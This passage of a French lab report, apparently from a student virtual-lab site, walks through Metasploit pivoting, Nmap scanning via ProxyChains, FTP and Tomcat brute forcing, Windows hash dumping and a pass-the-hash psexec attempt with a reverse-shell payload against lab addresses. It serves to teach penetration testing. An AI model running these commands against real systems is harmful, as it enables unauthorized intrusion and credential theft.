              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
mfs6 post(multi/manage/autoroute) > set SESSION 1
mfs6 post(multi/manage/autoroute) > set SUBNET 192.168.0.0
mfs6 post(multi/manage/autoroute) > set NETMASK /16
mfs6 post(multi/manage/autoroute) > set run
            </code></pre>
          </figure>
        </div>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-BR2JePcC.png" width="750" />
        <figcaption>
          Figure 56 ‚Äì Configuration de la route avec autoroute
        </figcaption>
        <p>
          L‚Äôoption <strong>Autoadd</strong> recherche les sous-r√©seaux valides dans la table de routage et la liste des
          interfaces de la session compromise, puis leur ajoute des routes. Ainsi, on obtient deux routes
          principales:
        </p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li><strong>10.10.10.0</strong>: Le r√©seau interne de l‚Äôentreprise ayant acc√®s √† internet qui a √©t√© infiltr√© par le
          hackeur et o√π on retrouve la machine Windows Server 2008 R2 et le routeur Pfsense.</li>
          <li><strong>192.168.100.0</strong>: Le r√©seau qui n‚Äôa pas acc√®s √† internet o√π seules les machines Windows
          Server 2008 R2 et Ubuntu 14.04 sont pr√©sentes.</li>
        </ul>
        
        <p>Avant de d√©marrer la configuration du proxy, on s‚Äôassure avec la commande ‚Äòroute print‚Äô que
          la route permettant la connexion vers la machine Windows 2008 a bien √©t√© ajout√©e √† la table de
          routage ainsi que celle permettant l‚Äôacc√®s au r√©seau cach√©.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">mfs6 auxiliary(server/socks_proxy) > route print
            </code></pre>
          </figure>
        </div>
        <!--CE4-->
        <img src="/monvirtuallab-site/assets/CE4-Bq2SNfCO.png" width="750" />
        <figcaption>
          Figure 57 ‚Äì Cr√©ation effective des deux routes
        </figcaption>
        <p>
          Les deux routes sont bien pr√©sentes dans la table de routage on peut donc passer √† la cr√©ation du
          SOCKS_proxy.
        </p>
        <!---->
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>SOCKS_proxy</li>
        </ul>
        <p>
          Selon les auteurs de l‚Äôouvrage Metasploit 2nd Edition, il est d√©conseill√© d‚Äôinstaller et d‚Äôex√©cuter
          Nmap directement sur la machine compromise (ici Windows Server 2008), car cela pourrait
          attirer l‚Äôattention de l‚Äôadministrateur du syst√®me et r√©v√©ler la pr√©sence de l‚Äôattaquant.
        </p>
        <p>Pour √©viter ce risque, il est pr√©f√©rable d‚Äôutiliser le protocole SOCKS combin√© √† ProxyChains
          afin de faire transiter l‚Äôanalyse Nmap depuis la machine attaquante (Kali Linux), √† travers l‚Äôh√¥te
          compromis, vers le r√©seau interne cibl√©.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
msf6 post(multi/manage/autoroute) > back
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > options
            </code></pre>
          </figure>
        </div>
        <!--CE5-->
        <img src="/monvirtuallab-site/assets/CE5-xaxV_oQX.png" width="750" />
        <figcaption>
          Figure 58 ‚Äì Lancement du module socks_proxy
        </figcaption>
        <p>
          Avant de lancer le module, l‚Äôattaquant doit configurer les param√®tres du protocole
          SOCKS qui est particuli√®rement utile pour rediriger du trafic TCP et UDP via un serveur interm√©diaire
          vers une autre adresse IP. Nous ne modifirons que le param√®tre suivant:
        </p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>
            <strong>SRVHOST:</strong>: L‚Äôadresse locale du serveur proxy, ici 127.0.0.1, qui correspond √† la machine
              attaquante.
          </li>
        </ul>
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > run
            </code></pre>
          </figure>
        </div>
        <!--CE6-->
        <img src="/monvirtuallab-site/assets/CE6-m_pM9zgj.png" width="750" />
        <figcaption>
          Figure 59 ‚Äì Configuration du serveur proxy avec socks_proxy
        </figcaption>
            
        <p>
          Selon Metasploit 2nd Edition, l‚Äôoutil <strong>ProxyChains</strong> est recommand√© comme client SOCKS afin de
          permettre √† la machine attaquante de se connecter au serveur proxy que l‚Äôattaquant vient de
          configurer.
        </p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>Configuration du client du serveur SOCKS proxy</li>
        </ul>
            
        <p>
          Pour d√©clarer les param√®tres du client SOCKS, il faut modifier le fichier proxychains4.conf 16
          situ√© dans le r√©pertoire /etc.
        </p>
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > run
            </code></pre>
          </figure>
        </div>
        <!--CE7-->
        <img src="/monvirtuallab-site/assets/CE7-BoGo4Nxk.png" width="750" />
        <figcaption>
          Figure 60 ‚Äì Ouverture du fichier proxychains4.conf avec l‚Äô√©diteur Nano
        </figcaption>
        <!--CE8-->
        <img src="/monvirtuallab-site/assets/CE8-BN7Ga_Og.png" width="750" />
        <figcaption>
          Figure 61 ‚Äì Ajout de la ligne socks5 127.0.0.1 1080 apr√®s les commentaires
        </figcaption>
        <p>
          Le serveur proxy √©coute maintenant par d√©faut sur le port 1080 de la machine attaquante. 
          En utilisant l‚Äôoutil Proxychains comme client avec Nmap, tout le trafic TCP et UDP g√©n√©r√© par
          Nmap passera par ProxyChains (via 127.0.0.1:1080) et sera achemin√© vers le serveur proxy sur
          l‚Äôh√¥te compromis, puis redirig√© vers le r√©seau interne de l‚Äôentreprise.
        </p>
        <p>
          Maintenant que la route est cr√©√©e et que le serveur proxy est op√©rationnel, l‚Äôattaquant peut
          envisager de lancer une attaque brute force sur l‚Äôun des services de l‚Äôordinateur cach√©.
        </p>
        <!---->
        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
            <!---->
      <div class="section content-section" id="vuln√©rabilit√©s">
        <h2>üîç Recherche de vuln√©rabilit√©s avant intrusion</h2>
        <p>
          Le hacker doit d‚Äôabord identifier les services vuln√©rables expos√©s par la machine cach√© 
          avant de pouvoir exploiter l‚Äôun de ces services en r√©alisant une attaque brute force qui 
          selon la CNIL consiste √† tester s√©quentiellement des couples compos√©s 
          d‚Äôun identifiant et d‚Äôun mot de passe sur l‚Äôinvite de connexion d‚Äôun des services de 
          la machine cach√©e.
        </p>
        <p>
          En effet, les services du syst√®me d‚Äôexploitation sont accessibles via des ports et 
          ces ports doivent √™tre ouverts pour pouvoir √™tre test√©s.
        </p>
        <!---->
        <h3>1. Recherche des vuln√©rabilit√©s avec Nmap via Proxychains</h3> 
        <p>
          Pour r√©aliser ce scanner des vuln√©rabilit√©s, le hacker lance Nmap via le client Proxychains depuis le
          terminal de commandes de Kali Linux √† l‚Äôaide de la commande suivante:
        </p> 
        <!--CODE-->
        <div class="center">
                  <figure class="ray-code">
                    <header class="ray-header">
                      <span class="dot red"></span>
                      <span class="dot yellow"></span>
                      <span class="dot green"></span>
                      <span class="title">bash</span>
                    </header>
                    <pre><code class="language-bash">$ sudo proxychains nmap -A -n -sT -Pn 192.168.100.3
                    </code></pre>
                  </figure>
                </div>
        <p>Selon nmap.org, l‚Äôoption:</p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li><strong>-A</strong>: Active la d√©tection du syst√®me d‚Äôexploitation et des versions, le script scanning et la traceroute.</li>
          <li><strong>-n</strong>: Ne jamais r√©soudre les noms des DNS</li>
          <li><strong>-sT</strong>: Effectue un scan TCP Connect() complet</li>
          <li><strong>-Pn</strong>: d√©sactivation de la d√©tection d‚Äôh√¥tes, l‚Äôh√¥te est consid√©r√© comme actif.</li>
        </ul>
        
        <p>Ce scan volontairement bruyant a pour but d‚Äô√©valuer l‚Äô√©tat des 1000 ports TCP les plus couramment 
          utilis√© sur une machine.</p>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-CSRmpIgp.png" width="750" />
        <figcaption>
          Figure 62 ‚Äì Scan de la machine avec Nmap via Proxychains
        </figcaption>
        <h3>Listes des vuln√©rabilit√©s</h3>
        <p>D‚Äôapr√®s l‚Äôextrait de scan, les ports TCP ouverts sont:</p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li><strong>21</strong>: FTP</li>
          <li><strong>22</strong>: SSH</li>
          <li><strong>445</strong>: Microsoft SMB/Samba</li>
          <li><strong>3306</strong>: MySQL</li>
          <li><strong>8000</strong>: Applications HTTP et Serveurs Web</li>
          <li><strong>8080</strong>: Outils de d√©veloppement et Serveurs Web</li>
        </ul>
        
        <p>√Ä l‚Äôissue de ce scan, le hacker semble avoir l‚Äôembarras du choix car plusieurs services courants sont
          ouverts. Il d√©cide donc de s‚Äôessayer √† une attaque par brute force sur le serveur FTP.</p>

        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
      <div class="section content-section" id="intrusion">
        <h2>üîì Tentative d'intrusion par Attaque Brute Force</h2>

        <h3>1. Le serveur FTP est-il anonyme ?</h3>
        
        <!---->
        <p>Avant de lancer notre attaque brute force sur le serveur FTP, assurons-nous qu‚Äôil ne soit pas
        accessible en mode Anonyme.</p>
        <p>Selon le site guide.ubuntu-fr.org, le mode Anonyme permet d‚Äôacc√©der au serveur en s‚Äôidentifiant
        avec un compte utilisateur dont les valeurs par d√©fauts sont : ¬´ anonymous ¬ª ou ¬´ ftp ¬ª pour le
        nom d‚Äôutilisateur et une adresse e-mail pour le mot de passe.</p>
        <p>Nous utiliserons pour cela, le module ftp_version.</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
msf6 auxiliary(server/socks_proxy) > back
msf6 auxiliary(server/socks_proxy) >
msf6 > use auxiliaryscanner/ftp/ftp_version
            </code></pre>
          </figure>
        </div>
        <p>
          On configure ce module avec l‚Äôadresse Ip de notre cible:
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>192.168.100.3</li>
          </ul>
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.100.3
msf6 auxiliary(scanner/ftp/ftp_version) > run
            </code></pre>
          </figure>
        </div>
          <!--CE1-->
          <img src="/monvirtuallab-site/assets/CE2-Bp8rk7g2.png" width="850" />
          <figcaption>
            Figure 63 ‚Äì S√©lection du module ftp_version
          </figcaption>
          <!--CE2-->
          <img src="/monvirtuallab-site/assets/CE2-Bp8rk7g2.png" width="850" />
          <figcaption>
            Figure 64 ‚Äì Configuration et lancement du module ftp_version
          </figcaption>
          <p>La sortie obtenue ne montre pas le message "FTP Anonymous login allowed". Le mode anonyme n‚Äôest
          pas activ√© sur le serveur FTP.</p>
          <!--CE3-->
          <img src="/monvirtuallab-site/assets/CE3-Ct8xguwJ.png" width="850" />
          <figcaption>
            Figure 65 ‚Äì Le serveur FTP n‚Äôest pas anonyme
          </figcaption>
          <p>Le hacker devra donc proc√©der avec la m√©thode brute force s‚Äôil souhaite obtenir les identifiants
          du serveur.</p>
          <!---->
          <h3>2. Attaque brute force sur le serveur FTP</h3>
          <!---->
          <p>Pour r√©aliser l‚Äôattaque par brute force, il faut d‚Äôabord s√©lectionner le dictionnaire de mots de
          passe qui sera utilis√© pour l‚Äôattaque.</p>
          <p>Selon l‚Äôouvrage Metasploit, 2nde √©dition, les dictionnaires sont disponibles dans le r√©pertoire
          /usr/share/wordlists, comme le montre la capture d‚Äô√©cran ci-dessous.</p>
          <!--CE1-->
          <img src="/monvirtuallab-site/assets/CE1-Css7pCJj.png" width="850" />
          <figcaption>
            Figure 66 ‚Äì R√©pertoire contenant les dictionnaires de mots de passe
          </figcaption>
          <p>On s√©lectionne comme indiqu√© dans l‚Äôouvrage le dictionnaire rockyou que l‚Äôon extrait de son
          archive compress√©e au format gz √† l‚Äôaide de la commande gunzip.</p>
          <!--CODE-->
          <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></pre>
            </figure>
          </div>
          <!--CE2-->
          <img src="/monvirtuallab-site/assets/CE2-DDvcEBuV.png" width="850" />
          <figcaption>
            Figure 67 ‚Äì Extraction du dictionnaire rockyou de son archive
          </figcaption>
          <p>
            Dans msf6, nous allons maintenant s√©lectionner le module ftp_login et le configurer comme suit:
            <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
              <li><strong>RHOSTS</strong>: adresse IP de la cible, 192.168.100.3</li>
              <li><strong>USER_FILE et PASS_FILE</strong>: chemin vers le dictionnaire rockyou, soit /usr/share/wordlists/rockyou.txt.gz</li>
            </ul>
          </p>
          <!--CODE-->
          <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">msf6 auxiliary(scanner/ftp/ftp_version) > back
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.100.3
msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE
/usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE
/usr/share/wordlists/rockyou.txt
</code></pre>
            </figure>
          </div>
          <!--CE3-->
          <img src="/monvirtuallab-site/assets/CE3-BduAOR-Q.png" width="750" />
          <figcaption>
            Figure 68 ‚Äì Configuration du module ftp_login de son archive
          </figcaption>
          <p>
          <p>Apr√®s avoir configur√© le module, celui-ci est lanc√© √† l‚Äôaide de la commande <strong>run</strong>:</p>
          <!--CODE-->
          <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">msf6 auxiliary(scanner/ftp/ftp_login) > run</code></pre>
            </figure>
          </div>
          <!--CE4-->
          <img src="/monvirtuallab-site/assets/CE4-B7Fle9Zi.png" width="750" />
          <figcaption>
            Figure 69 ‚Äì Lancement de l‚Äôattaque par brute force sur le serveur FTP
          </figcaption>
          <p>Les premi√®res tentatives se soldent par un √©chec comme on peut le voir sur la capture d‚Äô√©cran
          ci-dessous.</p>
          <!--CE5-->
          <img src="/monvirtuallab-site/assets/CE5-DolfyYJo.png" width="750" />
          <figcaption>
            Figure 70 ‚Äì √âchec des premi√®res combinaisons identifiant/mot de passe 
          </figcaption>
          <p>Apr√®s pr√®s de 48 heures d‚Äôex√©cution, l‚Äôattaquant se r√©sout √† abandonner, jugeant cette approche inefficace</p>
          <!--CE6-->
          <img src="/monvirtuallab-site/assets/CE6-BN3k913d.png" width="750" />
          <figcaption>
            Figure 71 ‚Äì Abandon de l'attaque par Brute Force apr√®s 48 heures d‚Äôex√©cution
          </figcaption>
        </ol>
        <p>L‚Äôid√©e retenue serait donc de tenter une attaque par brute force sur le serveur Tomcat.</p>
        <h3>3. Attaque Brute Force sur le serveur TomCat</h3>
        <!---->
        <p>Dans msf6, nous allons maintenant rechercher le module <strong>apache tomcat</strong>:</p>
        <!--CODE-->
        <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">msf6 auxiliary(scanner/ftp/ftp_login) > back
msf6 > search apache tomcat
msf6 > use auxiliary /scanner/http/tomcat_mgr_login
</code></pre>
            </figure>
          </div>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-D-g27r8w.png" width="750" />
        <figcaption>
          Figure 72 ‚Äì Recherche du module Apache Tomcat dans Metasploit
        </figcaption>
        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2-BfeOlGIO.png" width="750" />
        <figcaption>
          Figure 73 ‚Äì S√©lection du module tomcat_mgr_login
        </figcaption>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-8AMg6a7V.png" width="750" />
        <figcaption>
          Figure 74 ‚Äì Module pr√™t √† √™tre configur√©
        </figcaption>
        <!---->
        <p>
          et le configurer comme suit:
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li><strong>RHOSTS</strong>: adresse IP de la cible, 192.168.100.3</li>
            <li><strong>THREADS</strong>: 50</li>
            <li><strong>RPORT</strong>: 8180</li>
            <li><strong>VERBOSE</strong>: false</li>
            <li><strong>STOP_ON_SUCCESS</strong>: true</li>
          </ul>
        </p>
        <!--CODE-->
        <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">msf6 auxiliary (scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.100.3
msf6 auxiliary (scanner/http/tomcat_mgr_login) > set THREADS 50
msf6 auxiliary (scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary (scanner/http/tomcat_mgr_login) > set VERBOSE false
msf6 auxiliary (scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS false
</code></pre>
            </figure>
          </div>
        <!---->
        <p>
          Apr√®s avoir configur√© le module, celui-ci est lanc√© √† l‚Äôaide de la commande <strong>run</strong>:
        </p>
        <!--CODE-->
        <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">msf6 auxiliary (scanner/http/tomcat_mgr_login) > run</code></pre>
            </figure>
          </div>
        <!--CE4-->
        <img src="/monvirtuallab-site/assets/CE4-B5cSgim9.png" width="750" />
        <figcaption>
          Figure 75 ‚Äì Interruption pr√©matur√©e de l‚Äôattaque brute force sur Tomcat
        </figcaption>
        <p>L‚Äôinterruption brutale de l‚Äôattaque, avant m√™me son d√©marrage effectif, pousse le hacker √† v√©rifier
        l‚Äôaccessibilit√© du port du service.</p>
        <!--CODE-->
        <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">proxychains nmap -sS -Pn -p 8180 192.168.100.3</code></pre>
            </figure>
          </div>
        <p>
          Selon le site <a href="https://nmap.org/book/man-briefoptions.html">nmap.org</a>, les options utilis√©es sont:
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li><strong>-sS</strong>: effectue un scan SYN des ports (il s‚Äôagit d‚Äôun scan furtif c‚Äôest √† dire sans lancer la d√©tection
            du syst√®me d‚Äôexploitation ni des versions, ni de scripts ou traceroute)</li>
            <li><strong>-Pn</strong>: d√©sactive la phase de d√©couverte de l‚Äôh√¥te (il n‚Äôy aura donc pas de ping)</li>
            <li><strong>-p</strong>: permet de sp√©cifier le ou les port(s) √† scanner, ici le port √† scanner est le port 8180.</li>
          </ul>
        </p>
        <!--CE5-->
        <img src="/monvirtuallab-site/assets/CE5-Ca6tSj6Z.png" width="750" />
        <figcaption>
          Figure 76 ‚Äì Le port 8180 semble bloqu√© par un pare-feu
        </figcaption>
        <!---->
        <p>La sortie affich√©e dans le terminal Kali ci-dessus, montre que le port 8180 a le statut filtered, ce
        qui indique qu‚Äôil est probablement filtr√© ou bloqu√© par un pare-feu.</p>
        
       
        <p>Les tentatives d‚Äôintrusion sur les serveurs FTP et Tomcat par brute force se sont sold√©es par des
          √©checs, soit parce que le temps n√©cessaire pour deviner la bonne combinaison identifiant/mot de passe
          √©tait trop long, soit parce que le port √©tait tout simplement bloqu√© par un pare-feu.</p>
        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
      <div class="section content-section" id="usurpation">
        <h2>üîì Tentative d'intrusion par usurpation des mots de passe syst√®me</h2>
        <!---->
        <p>
          Le pirate adopte d√©sormais une autre strat√©gie : l‚Äôusurpation de l‚Äôensemble des mots de passe
          syst√®me de la machine d√©j√† compromise, √† savoir le serveur Windows Server 2008 R2 Standard.
          Pour ce faire, il utilisera le module post-exploitation <strong>smart_hashdump</strong>.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > sessions
msf6 > sessions -i 1
</code></pre>
            </figure>
          </div>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-HGELtCXR.png" width="750" />
        <figcaption>
          Figure 77 ‚Äì R√©cup√©ration du num√©ro de session et connexion √† la session avec la commande sessions
        </figcaption>
        <h3>1. üíª Extraction des hachages des noms d‚Äôutilisateur et des mots de passe du syst√®me avec le module <strong>smart_hashdump</strong>.</h3>
        <p>Une fois connect√©, il charge l‚Äôextension priv afin d‚Äôactiver les privil√®ges administrateur dans Meterpreter, ce qui lui permet d‚Äôextraire 
          les hachages des noms d‚Äôutilisateur et mots de passe du syst√®me.</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > use priv</code></pre>
          </figure>
        </div>
        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2-7fetid2r.png" width="750" />
        <figcaption>
          Figure 78 ‚Äì Chargement de l‚Äôextension priv
        </figcaption>
        <p>Selon les auteurs de l‚Äôouvrage Metasploit: The Penetration Tester‚Äôs Guide, 2e √©dition, ces hachages
          correspondent √† la forme chiffr√©e de ces informations, conform√©ment aux protocoles LAN Manager
          (LM), NT LAN Manager (NTLM) et NT LAN Manager v2 (NTLMv2).</p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > run post/windows/gather/smart_hashdump</code></pre>
          </figure>
        </div>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-CD9SDYB7.png" width="750" />
        <figcaption>
          Figure 79 ‚Äì Extraction des noms d‚Äôutilisateur et de leurs mots de passe hach√©s depuis le registre
        </figcaption>
        <h3>2. üéØ Recours √† la technique ¬´ pass the hash ¬ª</h3>
        <p>
          L‚Äôutilisation de cette technique est rendu possible du fait de l‚Äôexistence d‚Äôune faille 17 dans la
          conception du protocole NTLM qui accepte les hachages du mot de passe de l‚Äôutilisateur peut se faire
          passer pour lui.
        </p>
        <p>
          Le pirate va donc utiliser le module windows/smb/psexec pour r√©aliser cette attaque.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > background
msf6 > use exploit/windows/smb/psexec
</code></pre>
          </figure>
        </div>
        <p>Il le configure comme suit:</p>
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li><strong>PAYLOAD</strong>: code malveillant ex√©cut√© sur la cible apr√®s exploitation.</li>
            <li><strong>LHOST</strong>: adresse IP de la machine Windows 2008 interm√©diaire utilis√©e comme point de pivot vers la machine cach√©e.</li>
            <li><strong>LPORT</strong>: 443</li>
            <li><strong>RHOST</strong>: adresse IP de la machine cach√©e (192.168.100.3).</li>
            <li><strong>SMBUser</strong>: nom d‚Äôutilisateur pr√©sent dans la base des comptes compromis.</li>
             <li><strong>SMBPass</strong>: hachage NTLM correspondant √† l‚Äôutilisateur choisi.</li>
          </ul>
        
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 exploit(psexec)> set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(psexec)> set SESSION 1
msf6 exploit(psexec)> set LPORT 443
msf6 exploit(psexec)> set RHOST 192.168.100.3
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(psexec)> set SMBPass aad3b435b51404eeaad3b435b51404ee:
e02bc503339d51f71d913c245d35b50b
msf6 exploit(psexec)> exploit
</code></pre>
          </figure>
        </div>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-CSWzl62Q.png" width="750" />
        <figcaption>
          Figure 80 ‚Äì Echec de l‚Äôexploit avec la technique ¬´ pass the hash ¬ª
        </figcaption>
        <p>La technique ¬´ pass the hash ¬ª n‚Äôayant pas abouti, le pirate d√©cide alors de tenter de d√©coder les mots
        de passes hach√©s √† l‚Äôaide du logiciel de cassage de mots de passe, <strong>John the Ripper</strong>.</p>
        <!---->
        <h3>3. üîì D√©cryptage des hachages de mots de passes avec John the Ripper</h3>
        <p>
          John the Ripper est un logiciel libre con√ßu pour √©valuer la solidit√© des mots de passe en tentant de
          les casser. Il utilise principalement des attaques par dictionnaire.
          Selon <a href="https://fr.wikipedia.org/wiki/John_the_Ripper">Wikip√©dia</a>, ce programme reconna√Æt automatiquement le type de hachage employ√© (MD5, NTLM,
          SHA-2, etc) et en plus d‚Äôoffrir un large choix d‚Äôalgorithmes d‚Äôattaque permet de relancer une attaque
          qui a √©t√© interrompue.
        </p>
        <!---->
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>Identification du fichier contenant les mots de passes hach√©s</li>
        </ul>
        <p>
          Depuis Metasploit, le pirate saisit la commande creds qui permet de g√©rer les identifiants trouv√©s 
          et utilis√©s pour les machines cibl√©es.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > creds</code></pre>
          </figure>
        </div>
        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2--gdr0tgp.png" width="750" />
        <figcaption>
          Figure 81 ‚Äì Sortie de la commande creds
        </figcaption>
        <p>
          En examinant la sortie de la commande creds, le pirate remarque que trois entr√©es correspondent
          √† la machine cach√©e (192.168.100.3). Il va donc utiliser la commande grep pour filtrer et afficher
          uniquement les informations relatives √† ces entr√©es.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > grep 192.168.100.3 creds</code></pre>
          </figure>
        </div>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-CSvptPBC.png" width="750" />
      <figcaption>
        Figure 82 ‚Äì Filtrage de la commande creds √† l‚Äôaide de la commande grep
      </figcaption>
      <p>
        La commande loot lui permet ensuite de localiser le fichier contenant les noms d‚Äôutilisateurs et
        leurs mot de passe hach√©s.
      </p>
      <!--CODE-->
      <div class="center">
        <figure class="ray-code">
          <header class="ray-header">
            <span class="dot red"></span>
            <span class="dot yellow"></span>
            <span class="dot green"></span>
            <span class="title">bash</span>
          </header>
          <pre><code class="language-bash">msf6 > loot</code></pre>
        </figure>
      </div>
      <!--CE4-->
      <img src="/monvirtuallab-site/assets/CE4-Djm6plcI.png" width="750" />
      <figcaption>
        Figure 83 ‚Äì Localisation du fichier contenant les noms d‚Äôutilisateur et leurs mots de passes hach√©s avec la commande loot
      </figcaption>
      <p>
        Pour pr√©parer l‚Äôattaque avec John the Ripper, le pirate copie ce fichier vers le dossier Documents
        avec la commande <strong>cp</strong>.
      </p>
      <!--CODE-->
      <div class="center">
        <figure class="ray-code">
          <header class="ray-header">
            <span class="dot red"></span>
            <span class="dot yellow"></span>
            <span class="dot green"></span>
            <span class="title">bash</span>
          </header>
          <pre><code class="language-bash">msf6 > cp /root/.msf4/loot/20250812163411_default_10.10.10.2_windows.hashes_283651.txt
/home/vagrant/Documents
</code></pre>
        </figure>
      </div>
      <!--CE5-->
      <img src="/monvirtuallab-site/assets/CE5-Clpr1xgO.png" width="750" />
      <figcaption>
        Figure 84 ‚Äì Copie du fichier contenant les noms d‚Äôutilisateurs et leurs mot de passe hach√©s vers le dossier Documents
      </figcaption>
      <!---->
      <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
        <li>Cassage des mots de passe hach√©s avec John the Ripper</li>
      </ul>
      <p>
